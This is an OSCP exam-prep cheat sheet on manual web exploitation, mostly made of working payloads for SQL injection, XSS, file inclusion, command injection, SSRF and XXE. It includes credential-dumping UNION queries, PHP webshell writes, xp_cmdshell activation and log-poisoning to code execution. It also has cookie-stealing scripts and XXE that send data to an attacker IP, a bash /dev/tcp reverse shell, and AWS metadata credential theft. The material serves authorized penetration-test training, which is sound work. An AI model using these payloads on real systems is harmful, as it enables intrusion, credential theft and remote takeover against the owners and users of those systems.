# OSCP Core Web Vulnerability Methodology (Manual Exploitation)

*For authorized pentest/exam prep only — techniques and payloads below assume you have explicit written
authorization to test the target.*

*Scope note: this file covers the manual detection/exploitation methodology for the core OWASP-class
web vulnerabilities (SQLi, XSS, LFI/RFI, command injection, SSRF, XXE) — the "find and confirm it by hand"
step that sits **before** automation. For sqlmap tamper-script usage and shell escalation once an
injection point is already found, see [`web-attack-techniques.md` §5](web-attack-techniques.md#5-sqlmap--tamper-scripts--shell-escalation).
For file-upload bypass, deserialization, and WordPress/CMS attack techniques, see the rest of
[`web-attack-techniques.md`](web-attack-techniques.md).*

---

## 1. Manual SQL Injection

### 1.1 Detection
**Explanation:** Before reaching for sqlmap, confirm the injection by hand — it's faster for simple cases, avoids WAF noise, and is expected exam methodology. Test every parameter (GET/POST/cookie/header) with syntax-breaking and always-true/always-false payloads and compare responses.

**Example payloads:**
```
id=1'
id=1"
id=1`
id=1) 
id=1 AND 1=1   -- expect same page as id=1
id=1 AND 1=2   -- expect different/empty page if injectable
id=1' AND '1'='1
id=1' AND '1'='2
id=1' OR '1'='1'-- -
```
A DB error (MySQL `You have an error in your SQL syntax`, MSSQL `Unclosed quotation mark`, Oracle `ORA-00933`, PostgreSQL `syntax error at or near`) on the `'`/`"` test confirms unsanitized input reaches the query.

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html

---

### 1.2 UNION-Based Extraction
**Explanation:** Once injectable, find the column count with `ORDER BY`, then use `UNION SELECT` to pull arbitrary data (DB version, current user, table/column names, credentials) into the page's own output.

**Example (MySQL):**
```sql
id=1 ORDER BY 1-- -
id=1 ORDER BY 2-- -
id=1 ORDER BY 3-- -          -- keep incrementing until it errors; last successful N = column count

id=-1 UNION SELECT 1,2,3-- -                              -- identify which column(s) reflect in the page
id=-1 UNION SELECT 1,@@version,3-- -                       -- DB version
id=-1 UNION SELECT 1,database(),3-- -                      -- current DB
id=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
id=-1 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
id=-1 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users-- -
```
`0x3a` is the hex literal for `:`, used as a separator without breaking out of the string context. Set `id=-1` (a value that returns no real rows) so only the injected UNION row appears.

**Reference:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md

---

### 1.3 Error-Based Extraction
**Explanation:** When output isn't directly reflected but DB errors are shown on the page, force the DB to leak data inside its own error message — useful when UNION output has nowhere to display.

**Example (MySQL — `extractvalue`/`updatexml` XPath error trick):**
```sql
id=1 AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
id=1 AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -
```
`extractvalue`/`updatexml` throw an XPath syntax error containing the first ~32 chars of the subquery result (prefixed with `~` from `0x7e` as a visual marker); page through longer data with `SUBSTRING()`.

**Example (MSSQL — type-conversion error):**
```sql
id=1 AND 1=CONVERT(int,(SELECT @@version))--
```

**Reference:** https://portswigger.net/web-security/sql-injection/examining-the-database

---

### 1.4 Blind SQL Injection (Boolean-Based)
**Explanation:** No error and no reflected output — infer data one bit/character at a time by asking true/false questions and watching for a content or status-code difference between the true and false response.

**Example:**
```sql
id=1 AND 1=1        -- baseline "true" page
id=1 AND 1=2        -- baseline "false" page (compare length/content diff to the above)

id=1 AND (SELECT SUBSTRING(database(),1,1))='a'      -- test char-by-char
id=1 AND (SELECT ASCII(SUBSTRING(database(),1,1)))>109  -- binary-search the ASCII value, faster than linear a-z
```
Automate the character-by-character loop with a small script (or just switch to sqlmap once confirmed — see [`web-attack-techniques.md` §5](web-attack-techniques.md#5-sqlmap--tamper-scripts--shell-escalation)) once the true/false oracle is confirmed manually.

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html#confirming-with-timing

---

### 1.5 Blind SQL Injection (Time-Based)
**Explanation:** Use when there's no visible content/status difference at all between true/false conditions (fully blind) — inject a conditional `SLEEP()`/`WAITFOR DELAY` and measure the response time instead of the response content.

**Example:**
```sql
# MySQL
id=1 AND IF(1=1,SLEEP(5),0)-- -
id=1 AND IF((SELECT SUBSTRING(database(),1,1))='a',SLEEP(5),0)-- -

# MSSQL
id=1; IF (1=1) WAITFOR DELAY '0:0:5'--

# PostgreSQL
id=1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -

# Oracle
id=1 AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE 0 END FROM dual)-- -
```
A consistent ~5s delay on the true condition (vs. near-instant on false) confirms the injection. Confirm with `curl -w "%{time_total}\n"` or Burp's response-time column rather than eyeballing it.

**Reference:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md#exploitation

---

### 1.6 SQLi to OS Access (manual, pre-sqlmap)
**Explanation:** With `FILE` privilege (MySQL) or `xp_cmdshell` (MSSQL), a confirmed injection can escalate straight to reading/writing files or command execution by hand, without waiting on `sqlmap --os-shell`.

**Example (MySQL — write a webshell via `INTO OUTFILE`, requires `FILE` priv + known web root):**
```sql
id=-1 UNION SELECT 1,"<?php system($_GET['cmd']); ?>",3 INTO OUTFILE '/var/www/html/shell.php'-- -
```
**Example (MSSQL — enable and use `xp_cmdshell`, requires sysadmin):**
```sql
id=1; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
id=1; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
id=1; EXEC xp_cmdshell 'whoami';--
```

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/sql-injection/mysql-injection/index.html · https://book.hacktricks.wiki/en/pentesting-web/sql-injection/mssql-injection/index.html

---

## 2. Cross-Site Scripting (XSS)

### 2.1 Detection & Types
**Explanation:** Test every input (params, forms, headers like `User-Agent`/`Referer`, JSON body fields) and every place it's later reflected in the HTML response. Classify as **reflected** (payload in request, echoed immediately in that response — no persistence), **stored** (payload saved server-side, served to other viewers, e.g. a comment/profile field), or **DOM-based** (payload never reaches the server — a client-side JS sink like `innerHTML`/`document.write` renders attacker-controlled URL/hash data unsanitized).

**Example detection payloads (start unencoded, check output context first):**
```html
<script>alert(document.domain)</script>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)        <!-- for href/src-context or DOM sinks -->
```
Check the reflection context in view-source before assuming a filter blocks you — if input lands inside an existing `<script>` block, an attribute, or an HTML comment, the working payload differs (e.g. inside an attribute: `" onmouseover="alert(1)`; inside an existing script string: `';alert(1);//`).

**Reference:** https://portswigger.net/web-security/cross-site-scripting

---

### 2.2 Exploitation — Cookie/Session Theft
**Explanation:** For OSCP purposes the realistic goal of XSS is usually stealing an authenticated session cookie (or triggering an action as an admin/victim, e.g. CSRF-token exfil) rather than a client-side popup — set up a listener and exfiltrate.

**Example:**
```bash
# Attacker: catch the exfil
nc -lvnp 8000
```
```html
<script>new Image().src="http://10.10.14.1:8000/?c="+document.cookie</script>
<!-- or, more reliably across CSP/referrer policies -->
<script>fetch("http://10.10.14.1:8000/?c="+btoa(document.cookie))</script>
```
If `HttpOnly` blocks direct `document.cookie` access, pivot to acting *as* the victim instead of stealing the cookie — e.g. an XHR from the victim's browser that performs a privileged action (add-admin-user, change-password) and exfiltrates the response.

**Reference:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md

---

## 3. Local / Remote File Inclusion

### 3.1 Detection & Path Traversal
**Explanation:** LFI occurs when a file-path parameter (`?page=`, `?file=`, `?template=`, `?lang=`) is passed into a server-side include/read function without sanitization. Confirm with a known-good absolute-path traversal to a file that always exists.

**Example:**
```
http://target/index.php?page=../../../../etc/passwd
http://target/index.php?page=....//....//....//....//etc/passwd     # bypasses naive str_replace("../","") filters
http://target/index.php?page=..%2f..%2f..%2f..%2fetc%2fpasswd        # URL-encoded traversal
http://target/index.php?page=/etc/passwd%00                          # null-byte to strip an appended extension (PHP < 5.3.4)
```
On Windows targets: `..\..\..\..\windows\win.ini` (or its URL-encoded form `..%5c..%5c..%5c..%5cwindows%5cwin.ini`).

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html

---

### 3.2 PHP Wrapper Abuse (source disclosure & code execution)
**Explanation:** When LFI can't directly execute (or you need the *source* of a `.php` file rather than its rendered output), PHP's stream wrappers turn an LFI into arbitrary file read or direct RCE.

**Example — `php://filter` to base64-dump PHP source (read, not execute):**
```
http://target/index.php?page=php://filter/convert.base64-encode/resource=config
# then: base64 -d
```
**Example — `php://input` to execute POSTed PHP code (requires `allow_url_include=On`, rarer in modern configs):**
```bash
curl "http://target/index.php?page=php://input" --data '<?php system($_GET["cmd"]); ?>'
```
**Example — `data://` wrapper to execute inline base64 PHP (also needs `allow_url_include=On`, but works even with `allow_url_fopen=Off` since it's not a remote fetch):**
```
http://target/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```
(decodes to `<?php system($_GET['cmd']); ?>`)

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#php-wrappers

---

### 3.3 Log / Session Poisoning to RCE
**Explanation:** When wrappers are disabled, poison a file the app already includes so it contains attacker-controlled PHP, then trigger the LFI to execute it.

**Example — Apache/Nginx access-log poisoning:**
```bash
# Set a PHP payload as the User-Agent so it gets written into the access log
curl -s http://target/ -A '<?php system($_GET["cmd"]); ?>'
# Then include the log file (path varies by distro):
curl "http://target/index.php?page=../../../../var/log/apache2/access.log&cmd=id"
curl "http://target/index.php?page=../../../../var/log/nginx/access.log&cmd=id"
```
**Example — PHP session-file poisoning (works even when logs aren't readable):**
```bash
curl -s "http://target/index.php" -b "PHPSESSID=abc123" --data-urlencode 'x=<?php system($_GET["cmd"]); ?>'
# Session files live at /var/lib/php/sessions/sess_<PHPSESSID> on default Debian/Ubuntu configs — the
# posted param name (x) becomes the session key, planting the payload string into the session file.
curl "http://target/index.php?page=../../../../var/lib/php/sessions/sess_abc123&cmd=id"
```
**Example — SSH auth-log poisoning (LFI + exposed SSH, no web write primitive needed):**
```bash
ssh '<?php system($_GET["cmd"]); ?>'@target     # username itself becomes the payload; auth fails but gets logged
curl "http://target/index.php?page=../../../../var/log/auth.log&cmd=id"
```

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#via-php-session

---

### 3.4 Remote File Inclusion (RFI)
**Explanation:** When `allow_url_include=On` (rare, legacy PHP configs) the include parameter can point at an attacker-hosted URL directly — no local file needed at all.

**Example:**
```bash
# Attacker
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 8000
```
```
http://target/index.php?page=http://10.10.14.1:8000/shell.php&cmd=id
```

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#remote-file-inclusion

---

## 4. OS Command Injection

### 4.1 Detection
**Explanation:** Look for any feature that plausibly shells out server-side (ping/traceroute tools, file-conversion utilities, IP-lookup fields) and inject shell metacharacters. Confirm with a delay-based payload before assuming output-based confirmation will work (output may be suppressed even when the injection fires).

**Example payloads:**
```
127.0.0.1; id
127.0.0.1 && id
127.0.0.1 | id
127.0.0.1 `id`
127.0.0.1 $(id)
127.0.0.1; sleep 5          # blind confirmation — no output needed, just observe the delay
127.0.0.1|ping -n 5 127.0.0.1   # Windows blind confirmation equivalent
```

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/command-injection.html

---

### 4.2 Filter Bypass & Shell Payload
**Explanation:** Basic blacklists (blocked spaces, blocked specific keywords) are common on OSCP-style boxes — the standard bypasses below usually clear them.

**Example:**
```bash
# Space filter bypass
127.0.0.1;{cat,/etc/passwd}
127.0.0.1;cat${IFS}/etc/passwd
127.0.0.1;cat$IFS/etc/passwd

# Blocked-keyword bypass (e.g. "cat" blacklisted)
127.0.0.1;c'a't${IFS}/etc/passwd
127.0.0.1;/bin/c\at${IFS}/etc/passwd

# Straight to a reverse shell once confirmed
127.0.0.1;bash${IFS}-c${IFS}'bash${IFS}-i${IFS}>%26${IFS}/dev/tcp/10.10.14.1/4444${IFS}0>%261'
```
See [`CHEATSHEET.md` §5–6](../CHEATSHEET.md#5-msfvenom-payload-generation) for the full reverse-shell one-liner set once command execution is confirmed.

**Reference:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md

---

## 5. SSRF (Server-Side Request Forgery) — Primer

**Explanation:** Any feature that makes the server fetch a URL on the app's behalf (webhook config, "import from URL", PDF/image generators, avatar-from-URL uploaders, the `pingback.ping` WordPress method — see [`web-attack-techniques.md` §3.1](web-attack-techniques.md#31-manual-enumeration-no-tools)) can potentially be redirected to internal-only services, cloud metadata endpoints, or other ports on the target itself.

**Example:**
```
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/    # AWS instance-metadata credential theft
url=http://127.0.0.1:6379/                                               # port-scan/probe internal services from the server's vantage point
url=http://internal-only-host.corp.local:8080/admin
url=file:///etc/passwd                                                    # some SSRF sinks also accept file:// for local read
```
Bypass naive `localhost`/`127.0.0.1` blocklists with alternate representations: `http://0177.0.0.1/` (octal), `http://2130706433/` (decimal), `http://127.1/`, `http://[::1]/`, or a DNS name that resolves to `127.0.0.1` (`http://spoofed.burpcollaborator.net/` style rebinding domains). See [`service-enumeration-comprehensive.md`](service-enumeration-comprehensive.md) for the gopher-protocol SSRF-to-Redis-RCE chain when a raw-protocol SSRF primitive is available.

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html

---

## 6. XXE (XML External Entity) — Primer

**Explanation:** Apps that parse attacker-supplied XML with an XML parser that hasn't disabled external entity resolution (common in older/default configs of Java, PHP `libxml`, .NET) can be made to read local files or trigger SSRF by defining a custom entity that references a local path or URL.

**Example — classic file-read XXE:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><data>&xxe;</data></root>
```
**Example — blind/OOB XXE (when the parsed result isn't reflected back) via a hosted DTD:**
```xml
<!-- attacker-hosted evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://10.10.14.1:8000/?x=%file;'>">
%eval;
%exfil;
```
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://10.10.14.1:8000/evil.dtd"> %xxe; ]>
```
**Example — SSRF/port-scan via XXE:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
```
Look for XXE in any endpoint that accepts XML directly, but also in formats that embed XML internally (DOCX/XLSX/PPTX Office Open XML, SVG uploads, SOAP endpoints).

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/xxe-xml-external-entity/index.html

---

### Consolidated Reference List
- SQL Injection (index): https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md
- SQL Injection (HackTricks): https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html
- XSS: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
- File Inclusion (HackTricks): https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html
- Command Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md
- SSRF (HackTricks): https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html
- XXE (HackTricks): https://book.hacktricks.wiki/en/pentesting-web/xxe-xml-external-entity/index.html
- sqlmap automation (this repo): [`web-attack-techniques.md` §5](web-attack-techniques.md#5-sqlmap--tamper-scripts--shell-escalation)
